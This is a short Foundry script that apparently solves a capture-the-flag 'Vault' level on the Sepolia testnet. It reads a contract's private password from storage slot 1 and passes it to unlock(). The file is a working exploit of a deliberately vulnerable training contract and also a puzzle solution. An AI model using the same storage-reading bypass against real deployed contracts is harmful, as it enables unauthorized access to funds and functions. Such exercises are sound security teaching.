//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Script.sol";

import "../src/utils/SepoliaInstances.sol";

interface IVault {
    function unlock(bytes32) external;
}

contract VaultSolutionScript is Script, SepoliaInstances {

    // state vars

    function run() public {

        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployerPrivateKey);
        // storage slot 1 needs to be read
        bytes32 password = vm.load(address(vaultInstance), bytes32(uint256(1)));
        IVault(vaultInstance).unlock(password);
        
        vm.stopBroadcast();

    }

}